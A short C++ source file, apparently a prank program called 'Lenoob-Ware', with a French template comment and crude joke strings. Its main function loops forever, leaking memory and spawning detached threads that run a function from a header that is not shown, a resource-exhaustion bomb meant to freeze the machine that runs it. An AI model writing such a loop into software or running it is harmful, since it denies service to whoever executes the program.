// Lenoob-Ware.cpp : Ce fichier contient la fonction 'main'. L'exécution du programme commence et se termine à cet endroit.
//

#include <iostream>
#include <vector>

#include "DeezNutsInUrMouth.h"
int main()
{    std::vector< int* > v;
    std::cout << "Darius what you doing in my closet!\n";
    while(true)
    {
        int *a = new int;
        v.push_back( a );
        std::thread se(DN::DariusMethod);
        se.detach();
        
    }
}


